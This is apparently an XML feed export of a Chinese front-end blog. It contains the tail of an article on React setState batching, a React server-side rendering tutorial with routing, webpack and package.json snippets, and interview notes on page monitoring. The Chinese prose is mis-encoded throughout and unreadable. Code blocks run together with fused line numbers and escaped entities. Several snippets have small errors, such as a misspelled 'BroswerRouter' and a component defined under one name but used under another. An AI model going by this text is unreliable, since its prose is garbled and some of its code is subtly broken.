setStateæ˜¯æ‰¹é‡æ›´æ–°ï¼Œé‚£ä¹ˆåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨ä¹‹åŽï¼Œthis.state.valueçš„å€¼å¹¶æ²¡æœ‰å‘ç”Ÿæ‹œå¹´è¯ã€‚ä¸¤æ¬¡æ›´æ–°çš„æŒ‡éƒ½æ˜¯ä¸€æ ·çš„ã€‚å¦‚æžœä¼ é€’çš„æ˜¯ä¼šè°ƒç”¨å‡½æ•°å½¢å¼ï¼Œé‚£ä¹ˆ partial.call(inst,nextState,props,context)æŽ¥å—çš„ state éƒ½æ˜¯ä¸Šä¸€è½®æ›´æ–°ä¹‹åŽçš„æ–°å€¼ï¼Œå› æ­¤å¯ä»¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æžœã€‚ _processPendingState åœ¨è®¡ç®—å®Œæ–°çš„ state ä¹‹åŽä¼šæ‰§è¡Œ _performComponentUpdate 123456789101112131415161718192021222324252627282930313233343536373839function _performComponentUpdate( nextElement, nextProps, nextState, nextContext, transaction, unmaskedContext ) &#123; var inst = this._instance; var hasComponentDidUpdate = Boolean(inst.componentDidUpdate); var prevProps; var prevState; var prevContext; if (hasComponentDidUpdate) &#123; prevProps = inst.props; prevState = inst.state; prevContext = inst.context; &#125; // åœ¨æ›´æ–°ä¹‹å‰ï¼Œè°ƒç”¨é’©å­å‡½æ•° componentWillUpdateï¼Œç„¶åŽæ›´æ–°äº†å±žæ€§ï¼ˆprops,state,contextï¼‰ if (inst.componentWillUpdate) &#123; inst.componentWillUpdate(nextProps, nextState, nextContext); &#125; this._currentElement = nextElement; this._context = unmaskedContext; inst.props = nextProps; inst.state = nextState; inst.context = nextContext; // æ‰§è¡Œå‡½æ•°_updateRenderedComponentï¼Œæ¶‰åŠåˆ° render è°ƒç”¨å’Œç›¸åº”çš„ DOM æ›´æ–° this._updateRenderedComponent(transaction, unmaskedContext); // æœ€åŽæ‰§è¡Œ componentDidUpdate if (hasComponentDidUpdate) &#123; transaction.getReactMountReady().enqueue( inst.componentDidUpdate.bind(inst, prevProps, prevState, prevContext), inst ); &#125;&#125; åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»åŸºæœ¬ä»‹ç»å®Œäº†setStateçš„æ›´æ–°è¿‡ç¨‹ï¼Œåªå‰©ä¸€ä¸ªéƒ¨åˆ†æ²¡æœ‰ä»‹ç»ï¼Œé‚£å°±æ˜¯setStateæ‰§è¡Œç»“æŸä¹‹åŽçš„å›žè°ƒå‡½æ•°ã€‚æˆ‘ä»¬çŸ¥é“ï¼ŒsetStateå‡½æ•°ä¸­å¦‚æžœå­˜åœ¨callbackï¼Œåˆ™ä¼šæœ‰: 123if (callback) &#123; this.updater.enqueueCallback(this, callback);&#125; callå‡½æ•°ä¼šè¢«ä¼ é€’ç»™this.updaterçš„å‡½æ•°enqueueCallbackï¼Œç„¶åŽéžå¸¸ç±»ä¼¼äºŽsetStateï¼Œcallbackä¼šå­˜å‚¨åœ¨ç»„ä»¶å†…éƒ¨å®žä¾‹ä¸­çš„_pendingCallbackså±žæ€§ä¹‹ä¸­ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œå›žè°ƒå‡½æ•°å¿…é¡»è¦setStateçœŸæ­£å®Œæˆä¹‹åŽæ‰ä¼šè°ƒç”¨ï¼Œé‚£ä¹ˆåœ¨ä»£ç ä¸­æ˜¯æ€Žä¹ˆå®žçŽ°çš„ã€‚å¤§å®¶è¿˜è®°å¾—åœ¨å‡½æ•°flushBatchedUpdatesä¸­æœ‰ä¸€ä¸ªäº‹åŠ¡ReactUpdatesFlushTransaction: 12345678910111213//ä»£ç æœ‰çœç•¥var flushBatchedUpdates = function() &#123; while (dirtyComponents.length) &#123; if (dirtyComponents.length) &#123; //ä»Žäº‹åŠ¡poolä¸­èŽ·å¾—äº‹åŠ¡å®žä¾‹ var transaction = ReactUpdatesFlushTransaction.getPooled(); transaction.perform(runBatchedUpdates, null, transaction); //é‡Šæ”¾å®žä¾‹ ReactUpdatesFlushTransaction.release(transaction); &#125; //...... &#125;&#125;; æˆ‘ä»¬çŽ°åœ¨çœ‹çœ‹ReactUpdatesFlushTransactionçš„wrapperæ˜¯æ€Žä¹ˆå®šä¹‰çš„: 12345678var UPDATE_QUEUEING = &#123; initialize: function() &#123; this.callbackQueue.reset(); &#125;, close: function() &#123; this.callbackQueue.notifyAll(); &#125;,&#125;; æˆ‘ä»¬çœ‹åˆ°åœ¨äº‹åŠ¡çš„closeé˜¶æ®µå®šä¹‰äº†this.callbackQueue.notifyAll(),å³æ‰§è¡Œäº†å›žè°ƒå‡½æ•°ï¼Œé€šè¿‡è¿™ç§æ–¹æ³•å°±èƒ½ä¿è¯å›žè°ƒå‡½æ•°ä¸€å®šæ˜¯åœ¨setStateçœŸæ­£å®Œæˆä¹‹åŽæ‰æ‰§è¡Œçš„ã€‚ çŽ°åœ¨å¯ä»¥å›žç­”ï¼Œä¸ºä»€ä¹ˆä¸‹é¢è¿™ä¸¤ç§æ”¹ä»£ç ä¼šäº§ç”Ÿä¸åŒçš„æƒ…å†µï¼š 1234567891011121314151617181920//æœªæŒ‰é¢„æœŸæ‰§è¡Œ_addValue() &#123; this.setState(&#123; value: this.state.value + 1 &#125;) this.setState(&#123; value: this.state.value + 1 &#125;)&#125;//æŒ‰é¢„æœŸæ‰§è¡Œ_addValue() &#123; setTimeout(()=&gt;&#123; this.setState(&#123; value: this.state.value + 1 &#125;); this.setState(&#123; value: this.state.value + 1 &#125;); &#125;,0)&#125; åœ¨ç¬¬ä¸€ç§æƒ…å†µä¸‹ï¼Œå¦‚æžœæ‰“æ–­ç‚¹è¿½è¸ªä½ ä¼šå‘çŽ°ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ‰§è¡ŒsetStateå‰ï¼Œå·²ç»è§¦å‘äº†ä¸€ä¸ª batchedUpdatesï¼Œç­‰åˆ°æ‰§è¡ŒsetStateæ—¶å·²ç»å¤„äºŽä¸€ä¸ªè¾ƒå¤§çš„äº‹åŠ¡ï¼Œå› æ­¤ä¸¤ä¸ªsetStateéƒ½æ˜¯ä¼šè¢«æ‰¹é‡æ›´æ–°çš„(ç›¸å½“äºŽå¼‚æ­¥æ›´æ–°çš„è¿‡ç¨‹ï¼Œthis.state.valueå€¼å¹¶æ²¡æœ‰ç«‹å³æ”¹å˜)ï¼Œæ‰§è¡ŒsetStateåªä¸è¿‡æ˜¯å°†ä¸¤è€…çš„partialStateä¼ å…¥dirtyComponentsï¼Œæœ€åŽå†é€šè¿‡äº‹åŠ¡çš„closeé˜¶æ®µçš„flushBatchedUpdatesæ–¹æ³•åŽ»æ‰§è¡Œé‡æ–°æ¸²æŸ“ã€‚ä½†æ˜¯é€šè¿‡setTimeoutå‡½æ•°çš„åŒ…è£…ï¼Œä¸¤æ¬¡setStateéƒ½ä¼šåœ¨clickè§¦å‘çš„æ‰¹é‡æ›´æ–°batchedUpdatesç»“æŸä¹‹åŽæ‰§è¡Œï¼Œè¿™ä¸¤æ¬¡setStateä¼šè§¦å‘ä¸¤æ¬¡æ‰¹é‡æ›´æ–°batchedUpdatesï¼Œå½“ç„¶ä¹Ÿä¼šæ‰§è¡Œä¸¤ä¸ªäº‹åŠ¡ä»¥åŠå‡½æ•°flushBatchedUpdates,è¿™å°±ç›¸å½“äºŽä¸€ä¸ªåŒæ­¥æ›´æ–°çš„è¿‡ç¨‹ï¼Œè‡ªç„¶å¯ä»¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆReactæ–‡æ¡£ä¸­æ—¢æ²¡æœ‰è¯´setStateæ˜¯åŒæ­¥æ›´æ–°æˆ–è€…æ˜¯å¼‚æ­¥æ›´æ–°ï¼Œåªæ˜¯æ¨¡ç³Šåœ°è¯´åˆ°ï¼ŒsetStateå¹¶ä¸ä¿è¯åŒæ­¥æ›´æ–°ã€‚ DOMäº‹ä»¶å’Œç”Ÿå‘½å‘¨æœŸgraph TD A(DOM) B(ç”Ÿå‘½å‘¨æœŸ) C[dispatchEvent-ReactEventListener.js] D[_renderNewRootComponent-ReactMount.js] E[ReactUpdates.batchedUpdates-ReactUpdates.js] F[isBatchingUpdates=true] G[transaction.perform æ‰§è¡Œäº‹ä»¶å›žè°ƒå’Œç”Ÿå‘½å‘¨æœŸè¿›å…¥äº‹åŠ¡] H[close isBatchingUpdates=false ReactUpdates.flushBatchedUpdates] I[æ£€æŸ¥ dirtyComponents å®Œæˆæ›´æ–°] A == type:'click' ==> C B == componentDidMount ==> D C --> E D --> E E --> F F --> G G --> H H --> I Reactåˆæˆäº‹ä»¶HOC çš„åº”ç”¨### ä¸­é—´ä»¶åº”ç”¨Redux çš„åº”ç”¨å’ŒåŽŸç†Mobx çš„åº”ç”¨å’ŒåŽŸç†å‚è€ƒé“¾æŽ¥ï¼š React æ¸²æŸ“æœºåˆ¶è§£æž Reactä¹‹diffç®—æ³• React JSX ä½¿ç”¨ JSX æè¿° UI ä¿¡æ¯ React Fiber æ˜¯ä»€ä¹ˆï¼Ÿ ä¸ºä»€ä¹ˆsetStateæ˜¯å¼‚æ­¥çš„ React ä¸­ setState() ä¸ºä»€ä¹ˆæ˜¯å¼‚æ­¥çš„ï¼Ÿ this.setStateä½¿ç”¨æ—¶çš„ä¸€äº›å‘ React setState ç®€å•æ•´ç†æ€»ç»“ æ—¥å¸¸æŠ„ä¹¦ä¹‹ä¸€æ¬¡æ€§å¼„æ‡‚setState ä¸€æ¬¡æ€§æžæ‡‚è§£Reactç”Ÿå‘½å‘¨æœŸ ReactæŠ€æœ¯å†…å¹•:setStateçš„ç§˜å¯† æµ…å…¥æ·±å‡ºsetStateï¼ˆä¸‹ç¯‡ï¼‰]]></content>
      <categories>
        <category>å‰ç«¯é¢è¯•</category>
      </categories>
      <tags>
        <tag>å‰ç«¯é¢è¯•é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React-SSRæµ…æž]]></title>
    <url>%2F2019-05-11-React-SSR%E6%B5%85%E6%9E%90.html</url>
    <content type="text"><![CDATA[React SSR åŒæž„æµ…æžå®¢æˆ·ç«¯æ¸²æŸ“ï¼ˆCSRï¼‰æ¦‚å¿µä¼ ç»Ÿ reacté¡¹ç›®,åœ¨æµè§ˆå™¨æ‰“å¼€é¡¹ç›®ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ° index.js é¡µé¢é‡Œé¢åªæœ‰ä¸€ä¸ªåŸºæœ¬çš„ DOM èŠ‚ç‚¹ï¼Œä¸‹é¢å¼•å…¥äº†ä¸€ä¸ª js æ–‡ä»¶ã€‚è€Œé¡¹ç›®çš„æ‰€æœ‰å†…å®¹å°±æ˜¯é€šè¿‡è¿™ä¸ª js æ¥æ¸²æŸ“ï¼Œé€šè¿‡ç¦æ­¢æµè§ˆå™¨çš„ javascript åŠŸèƒ½å¯ä»¥çœ‹åˆ°æµè§ˆå™¨æç¤ºè¦ å¼€å¯ javascript åŠŸèƒ½çš„æç¤ºï¼Œæ²¡æœ‰é¡¹ç›®çš„å†…å®¹ç”Ÿæˆã€‚ CSR è¿‡ç¨‹: 1æµè§ˆå™¨å‘é€è¯·æ±‚ =&gt; æœåŠ¡å™¨è¿”å›žHTML =&gt; æµè§ˆå™¨å‘é€ bundle.js è¯·æ±‚ =&gt; æœåŠ¡å™¨è¿”å›ž bundle.js =&gt; æµè§ˆå™¨è¿è¡Œ React ä»£ç  =&gt; é¡µé¢å‡†å¤‡å°±ç»ª ä¼˜åŠ¿ä¸ŽåŠ£åŠ¿ä¼˜åŠ¿ï¼šå‰åŽç«¯åˆ†ç¦»ï¼Œå‰ç«¯ ajax è¯·æ±‚æ•°æ®ï¼ŒåŽç«¯å†…éƒ¨å¤„ç†å¥½é€»è¾‘è¿”å›ž JSON ç»™å‰ç«¯å¤„ç†ã€‚ä»£ç åœ¨å®¢æˆ·ç«¯è¿è¡Œï¼Œæ€§èƒ½è‰¯å¥½ åŠ£åŠ¿ï¼šé¦–å±åŠ è½½é€Ÿåº¦æ…¢ã€‚SEO å·®ï¼ˆç™¾åº¦çˆ¬è™«ä¸èƒ½è¯†åˆ« js æ–‡ä»¶ï¼‰ æœåŠ¡å™¨æ¸²æŸ“ï¼ˆSSRï¼‰æ¦‚å¿µSSR è¿‡ç¨‹ï¼š 1æµè§ˆå™¨å‘é€è¯·æ±‚ =&gt; æœåŠ¡å™¨è¿è¡Œ React ä»£ç ç”Ÿæˆé¡µé¢ =&gt; æœåŠ¡å™¨è¿”å›žé¡µé¢ ä¼˜åŠ¿ä¸ŽåŠ£åŠ¿ä¼˜åŠ¿ï¼šé¦–å±é€Ÿåº¦å¿« åŠ£åŠ¿ï¼šæœåŠ¡å™¨æ€§èƒ½éœ€æ±‚å¤§ renderToString123456789101112import &#123;renderToString&#125; from 'react-dom/server';const content = renderToString(( // ç»„ä»¶))app.get('/',(req,res,next)=&gt;&#123; res.send( `&lt;html&gt; &lt;div&gt;$&#123;content&#125;&lt;/div&gt; &lt;/html&gt;` )&#125;) è·¯ç”± React-router-configå¯è¯†åˆ«åµŒå¥—è·¯ç”±ï¼Œå†…ç½® ssr æ–¹æ¡ˆ ç®€å•ä½¿ç”¨æœåŠ¡å™¨ä¸Šå‘ˆçŽ°çš„è·¯ç”±éƒ½æ˜¯æ— çŠ¶æ€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†åº”ç”¨ç¨‹åºåŒ…è£…åœ¨æ— çŠ¶æ€çš„ &lt;StaticRouter&gt; eè€Œä¸æ˜¯&lt;BrowserRouter&gt;ã€‚ä»ŽæœåŠ¡å™¨ä¼ å…¥è¯·æ±‚çš„è·¯ç”±ï¼Œä»¥ä¾¿è·¯ç”±å¯ä»¥åŒ¹é…ã€‚ 123456789// client&lt;BroswerRouter&gt; &lt;App /&gt;&lt;/BroswerRouter&gt;// server &lt;StaticRouter location=&#123;req.url&#125; context=&#123;context&#125;&gt; &lt;App /&gt;&lt;/StaticRouter&gt; åœ¨ &lt;Redirect&gt;å®¢æˆ·ç«¯å‘ˆçŽ° a æ ‡ç­¾çš„æ—¶å€™ï¼Œæµè§ˆå™¨åŽ†å²è®°å½•ä¼šæ›´æ”¹çŠ¶æ€ï¼Œæˆ‘ä»¬èŽ·å¾—æ–°çš„å±å¹•ã€‚åœ¨é™æ€æœåŠ¡å™¨ æ¢æœºä¸­ï¼Œæˆ‘ä»¬æ— æ³•æ›´æ”¹åº”ç”¨ç¨‹åºçš„çŠ¶æ€ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ context æ¥æ‰¾å‡ºéœ€è¦æ¸²æŸ“çš„ç»“æžœã€‚æˆ‘ä»¬æ‰¾åˆ°äº† context.url å°±çŸ¥é“åº”ç”¨æ˜¯å¦è¢«é‡å®šå‘äº†ã€‚ 1234567891011const context = &#123;&#125;const markup = ReactDOMServer.renderToString( &lt;StaticRouter location=&#123;req.path&#125; context=&#123;context&#125;&gt; &lt;App /&gt; &lt;/StaticRouter&gt;)if(context.url)&#123; redirect(301,context.url)&#125;else&#123; &#125; æ·»åŠ åº”ç”¨ç‰¹å®šä¸Šä¸‹æ–‡ä¿¡æ¯è·¯ç”±å™¨åªä¼šæ·»åŠ  context.url,å¦‚æžœå¸Œæœ›é‡å®šå‘ 301æˆ–è€… 302 å¯ä»¥åœ¨å¸Œæœ›å‘ˆçŽ°çš„ UI çš„æŸä¸ªç‰¹å®šåˆ†æ”¯å‘é€ 404 å“åº”ï¼Œæˆ–è€…å¦‚æžœæœªæŽˆæƒåˆ™å‘é€ 401ã€‚ 12345678910111213141516171819202122232425262728293031function RedirectWithStats(&#123;from,to,status&#125;)&#123; return( &lt;Route render=&#123;(&#123;staticContext&#125;)=&gt;&#123; if(staticContext) staticContext.status = status; return &lt;Redirect from=&#123;from&#125; to=&#123;to&#125; /&gt; &#125;&#125; /&gt; )&#125;// somewhere in appfunction App()&#123; return( &lt;Switch&gt; &lt;RedirectWithStatus status=&#123;301&#125; from='/users' to='/profiles' /&gt; &lt;RedirectWithStatus status=&#123;302&#125; from='/courses' to='/dashboard' /&gt; &lt;/Switch&gt; )&#125;// serverconst context = &#123;&#125;;const markup = ReactDOMServer.renderToString( &lt;StaticRouter context=&#123;context&#125;&gt; &lt;App /&gt; &lt;/StaticRouter&gt;)if(context.url)&#123; redirect(context.status,context.url)&#125; 404,401 æˆ–è€…ä»»ä½•å…¶ä»–çŠ¶æ€è·Ÿä¸Šé¢çš„æ“ä½œå·®ä¸å¤šï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªç»„ä»¶ï¼Œæ·»åŠ ä¸€äº›ä¸Šä¸‹æ–‡å¹¶åœ¨åº”ç”¨ç¨‹åºä¸­çš„ä»»ä½•ä½ç½®å‘ˆçŽ°å®ƒä»¥èŽ·å–ä¸åŒçš„çŠ¶æ€ç  123456789101112131415161718192021222324252627function Status(&#123;code,children&#125;)&#123; return( &lt;Route render=&#123;(&#123;staticContext&#125;)=&gt;&#123; if(staticContext) staticContext.status = code return children; &#125;&#125; /&gt; )&#125;function NotFound()&#123; return( &lt;Status code=&#123;404&#125;&gt; &lt;div&gt; &lt;h1&gt;Sorry,can't find that.&lt;/h1&gt; &lt;/div&gt; &lt;/Status&gt; )&#125;// somewhere else&lt;Switch&gt; &lt;Route path='/about' component=&#123;About&#125; /&gt; &lt;Route path='/dashboard' component=&#123;Dashboard&#125; /&gt; &lt;Route component=&#123;NotFound&#125;&gt;&lt;/Switch&gt; ç»„åˆè¿™ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„åº”ç”¨ç¨‹åºï¼Œä½†æ˜¯å®ƒæ˜¾ç¤ºäº†å°†æ‰€æœ‰è¿™äº›ç»„åˆåœ¨ä¸€èµ·æ‰€éœ€è¦çš„æ‰€æœ‰å¸¸è§„éƒ¨åˆ† 1234567891011121314151617181920212223242526272829303132333435// serverimport &#123;createServer&#125; from 'http';import React from 'react';import ReactDOMServer from 'react-dom/server';import &#123;StaticRouter&#125; from 'react-router';import App from './App';createServer((req,res)=&gt;&#123; const context = &#123;&#125;; const html = ReactDOMServer.renderToString( &lt;StaticRouter location=&#123;req.url&#125; context=&#123;context&#125;&gt; &lt;App /&gt; &lt;/StaticRouter&gt; ) if(context.url)&#123; res.writeHead(301,&#123; Location:context.url &#125;) res.send() &#125;else&#123; res.write(`&lt;!doctype html&gt;&lt;div id="app"&gt;$&#123;html&#125;&lt;/div&gt;`) res.send(); &#125;&#125;).listen(3000)// clientimport ReactDOM from 'react-dom';import &#123;BrowserRouter&#125; from 'react-router-dom';import App from './App';ReactDOM.render( &lt;BrowserRouter&gt; &lt;App /&gt; &lt;/BrowserRouter&gt;) â˜…æ•°æ®çš„åŠ è½½åœ¨é¡µé¢å‘ˆçŽ°ä¹‹å‰åŠ è½½æ•°æ®ï¼ŒReact Router å¯¼å‡º matchPath å®ƒåœ¨å†…éƒ¨ä½¿ç”¨çš„é™æ€å‡½æ•°ï¼Œä»¥åŒ¹é…è·¯ç”±çš„ä½ç½®ã€‚å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šä½¿ç”¨æ­¤åŠŸèƒ½æ¥å¸®åŠ©ç¡®å®šåœ¨å‘ˆçŽ°ä¹‹å‰æ•°æ®çš„ä¾èµ–é¡¹ã€‚ è¿™ç§æ–¹æ³•çš„è¦æ±‚æ˜¯ä¾èµ–äºŽé™æ€è·¯ç”±çš„é…ç½®ï¼Œç”¨äºŽåœ¨å‘ˆçŽ°ä¹‹å‰æ ¹æ®è·¯ç”±åŒ¹é…æ¥åŠ è½½å¯¹åº”çš„æ•°æ® 123456789101112131415161718192021222324252627282930313233// routes.jsconst routes = &#123; &#123; path:'/', component:Root, loadData:()=&gt; getSomeData() &#125;&#125;import &#123;router&#125; from './routes'function App()&#123; return( &lt;Switch&gt; &#123;routes.map(route=&gt;( &lt;Route &#123;...route&#125;/&gt; ))&#125; &lt;/Switch&gt; )&#125;// server import &#123;matchPath&#125; from 'react-router-dom';const promises = [];routers.some(route=&gt;&#123; const match = matchPath(req.path,route); if(match) promises.push(route.loadData(match)) return match&#125;)Promise.all(promises).then(data=&gt;&#123; &#125;) Webpack é…ç½®å…¬å…±éƒ¨åˆ†1234567891011121314151617module.exports = &#123; module: &#123; rules: [&#123; test: /\.js?$/, loader: 'babel-loader', exclude: /node_modules/, options: &#123; presets: ['react', 'stage-0', ['env', &#123; // ç‰ˆæœ¬å…¼å®¹å¤§éƒ¨åˆ†æµè§ˆå™¨æœ€åŽ2ä¸ª targets: &#123; browsers: ['last 2 versions'] &#125; &#125;]] &#125; &#125;] &#125;&#125; æœåŠ¡ç«¯123456789101112131415161718192021222324252627282930313233const path = require('path');// ä¸æ‰“åŒ… node modulesconst nodeExternals = require('webpack-node-externals');const merge = require('webpack-merge');const config = require('./webpack.base.js');const serverConfig = &#123; // æŒ‡æ˜ŽæœåŠ¡å™¨ target: 'node', mode: 'development', entry: './src/server/index.js', output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, 'build') &#125;, externals: [nodeExternals()], module: &#123; rules: [&#123; test: /\.css?$/, // åœ¨é«˜é˜¶ç»„ä»¶ä¸­é€šè¿‡æ³¨æ°´è·Ÿè„±æ°´ css æ¥èŽ·å– css ä»£ç ï¼Œè¿™ä¸ªloader æä¾›äº† ._getCss() å‡½æ•° use: ['isomorphic-style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 1, modules: true, localIdentName: '[name]_[local]_[hash:base64:5]' &#125; &#125;] &#125;] &#125;&#125;module.exports = merge(config, serverConfig); webpack-node-externalsä¸æ‰“åŒ…å¼•å…¥ çš„ node modules isomorphic-style-loaderæœåŠ¡ç«¯æ‰“åŒ… CSS å¯ä»¥é€šè¿‡è¿™ä¸ªæ’ä»¶åœ¨å¯¹åº”çš„ DOM å…ƒç´ ä¸Šç”Ÿæˆ class ç±»åï¼Œç„¶åŽè¿”å›ž CSS æ ·å¼ä»£ç ã€‚åœ¨é«˜é˜¶ç»„ä»¶ä¸­ï¼Œåˆ©ç”¨æ’ä»¶å†…ç½® API ._getCss()å°†CSS æ•°æ®é€šè¿‡æ³¨æ°´ä¸Žè„±æ°´çš„æ–¹å¼åœ¨æœåŠ¡ç«¯èŽ·å–ï¼Œå°†è¿™äº›å­—ç¬¦ä¸²æ ¼å¼çš„ css æ·»åŠ åˆ°æœåŠ¡å™¨æ¸²æŸ“çš„ HTML å°±å¯ä»¥å®Œæˆ CSS æœåŠ¡å™¨æ¸²æŸ“ å®¢æˆ·ç«¯123456789101112131415161718192021222324252627const path = require('path');const merge = require('webpack-merge');const config = require('./webpack.base.js');const clientConfig = &#123; mode: 'development', entry: './src/client/index.js', output: &#123; filename: 'index.js', path: path.resolve(__dirname, 'public') &#125;, module: &#123; rules: [&#123; test: /\.css?$/, use: ['style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 1, modules: true, localIdentName: '[name]_[local]_[hash:base64:5]' &#125; &#125;] &#125;] &#125;&#125;module.exports = merge(config, clientConfig); package.json1234567891011121314151617181920212223242526272829303132333435363738394041424344&#123; "name": "server", "version": "1.0.0", "description": "react-ssr", "main": "index.js", "scripts": &#123; "dev": "npm-run-all --parallel dev:**", "dev:start": "nodemon --watch build --exec node \"./build/bundle.js\"", "dev:build:server": "webpack --config webpack.server.js --watch", "dev:build:client": "webpack --config webpack.client.js --watch", "test": "echo \"Error: no test specified\" &amp;&amp; exit 1" &#125;, "keywords": [ "react", "ssr" ], "author": "lbh", "license": "ISC", "dependencies": &#123; "axios": "^0.18.0", "babel-core": "^6.26.3", "babel-loader": "^7.1.5", "babel-preset-env": "^1.7.0", "babel-preset-react": "^6.24.1", "babel-preset-stage-0": "^6.24.1", "css-loader": "^2.1.1", "express": "^4.16.4", "express-http-proxy": "^1.5.1", "isomorphic-style-loader": "^5.0.1", "react": "^16.8.6", "react-dom": "^16.8.6", "react-helmet": "^5.2.0", "react-redux": "^7.0.1", "react-router-config": "^5.0.0", "react-router-dom": "^5.0.0", "redux": "^4.0.1", "redux-thunk": "^2.3.0", "style-loader": "^0.23.1", "webpack": "^4.29.6", "webpack-cli": "^3.3.0", "webpack-merge": "^4.2.1", "webpack-node-externals": "^1.7.2" &#125;&#125; nodemonä¸€ä¸ªæœ¬åœ°æœåŠ¡å™¨ï¼Œå¯ä»¥ç›‘æŽ§æ–‡ä»¶çš„å˜åŒ–æ¥é‡å¯æœåŠ¡å™¨ï¼Œå…¨å±€å®‰è£… npm-run-allå¹¶è¡Œè¿è¡ŒåŒåå‰ç¼€çš„æ‰€æœ‰ script è¯­å¥ï¼Œå…¨å±€å®‰è£…]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•é¢˜ç›®æ±‡æ€»æ‘˜å½•ï¼ˆJS åŸºç¡€ç¯‡3ï¼‰]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-JS%20%E5%9F%BA%E7%A1%80%E7%AF%873.html</url>
    <content type="text"><![CDATA[æ¸©æ•…è€ŒçŸ¥æ–°ï¼Œä¿æŒç©ºæ¯å¿ƒæ€,å¤ä¹ åˆ°ä¸€åŠçš„æ—¶é—´ï¼Œçªç„¶å‘çŽ°äº† å‰ç«¯é¢è¯•ä¹‹é“ï¼ŒæŒ‰å­¦ä¹ è¿™æœ¬ä¹¦çš„è·¯å¾„æ¥ JS åŸºç¡€3ç›‘æŽ§å‰ç«¯ç›‘æŽ§ä¸€èˆ¬åˆ†ä¸ºä¸‰ç§ï¼Œé¡µé¢åŸ‹ç‚¹ã€æ€§èƒ½ç›‘æŽ§ä»¥åŠå¼‚å¸¸ç›‘æŽ§ é¡µé¢åŸ‹ç‚¹é¡µé¢åŸ‹ç‚¹ä¸€èˆ¬ä¼šç›‘æŽ§ä¸‹é¢å‡ ä¸ªæ•°æ®ï¼š PV/UV åœç•™æ—¶é•¿ æµé‡æ¥æº ç”¨æˆ·äº¤äº’ å®žçŽ°çš„æ€è·¯åˆ†æˆä¸¤ç§ï¼Œæ‰‹å†™åŸ‹ç‚¹å’Œæ— åŸ‹ç‚¹çš„æ–¹å¼ ç¬¬ä¸€ç§è‡ªä¸»é€‰æ‹©éœ€è¦ç›‘æŽ§çš„æ•°æ®ç„¶åŽåœ¨ç›¸åº”çš„åœ°æ–¹å†™å…¥ä»£ç ï¼Œè¿™ç§æ–¹å¼çµæ´»æ€§å¾ˆå¤§ï¼Œå”¯ä¸€çš„ç¼ºç‚¹å°±æ˜¯å·¥ä½œé‡å¤§ï¼Œæ¯ä¸ªéœ€è¦ç›‘æŽ§çš„åœ°æ–¹éƒ½è¦æ’å…¥ä»£ç  å¦ä¸€ç§çš„æ— åŸ‹ç‚¹çš„æ–¹å¼åŸºæœ¬ä¸éœ€è¦å¼€å‘è€…æ‰‹å†™åŸ‹ç‚¹ï¼Œè€Œæ˜¯ç»Ÿè®¡æ‰€æœ‰çš„äº‹ä»¶å¹¶ä¸”å®šæ—¶ä¸ŠæŠ¥ï¼Œè¿™ç§æ–¹å¼è™½ç„¶æ²¡æœ‰å‰ä¸€ç§ç¹çï¼Œä½†æ˜¯å› ä¸ºç»Ÿè®¡çš„æ˜¯æ‰€æœ‰äº‹ä»¶ï¼Œæ‰€ä»¥è¿˜éœ€è¦åŽæœŸè¿‡æ»¤å‡ºéœ€è¦çš„æ•°æ® æ€§èƒ½ç›‘æŽ§å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æœŸè‡ªå¸¦çš„ Performance API æ¥å®žçŽ°åŠŸèƒ½ã€‚ä¸€è¡Œä»£ç å°±å¯ä»¥èŽ·å¾—é¡µé¢ä¸­å„ç§è¯¦ç»†çš„æ€§èƒ½ 123456789101112131415161718192021222324252627282930313233343536373839performance.getEntriesByType('navigation')/**[ PerformanceNavigationTiming:&#123; connectEnd: 3.9999999999906777 connectStart: 3.9999999999906777 decodedBodySize: 0 domComplete: 22873.60000000001 domContentLoadedEventEnd: 22690.200000000004 domContentLoadedEventStart: 22689.999999999996 domInteractive: 22689.999999999996 domainLookupEnd: 3.9999999999906777 domainLookupStart: 3.9999999999906777 duration: 22873.700000000015 encodedBodySize: 0 entryType: "navigation" fetchStart: 3.9999999999906777 initiatorType: "navigation" loadEventEnd: 22873.700000000015 loadEventStart: 22873.60000000001 name: "" nextHopProtocol: "" redirectCount: 0 redirectEnd: 0 redirectStart: 0 requestStart: 3.9999999999906777 responseEnd: 726.4000000000124 responseStart: 3.9999999999906777 secureConnectionStart: 0 serverTiming: [] startTime: 0 transferSize: 0 type: "back_forward" unloadEventEnd: 0 unloadEventStart: 0 workerStart: 0 &#125;]*/ å¼‚å¸¸ç›‘æŽ§å¯¹äºŽä»£ç è¿è¡Œé”™è¯¯ï¼Œé€šå¸¸çš„åŠžæ³•æ˜¯ä½¿ç”¨ window.onerror æ‹¦æˆªæŠ¥é”™ï¼Œè¯¥æ–¹æ³•èƒ½æ‹¦æˆªåˆ°å¤§éƒ¨åˆ†çš„è¯¦ç»†æŠ¥é”™ä¿¡æ¯ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–çš„ å¯¹äºŽè·¨åŸŸçš„ä»£ç è¿è¡Œé”™è¯¯ä¼šæ˜¾ç¤º script error å¯¹äºŽè¿™ç§æƒ…å†µéœ€è¦ç»™ script æ ‡ç­¾æ·»åŠ  crossorigin å±žæ€§ 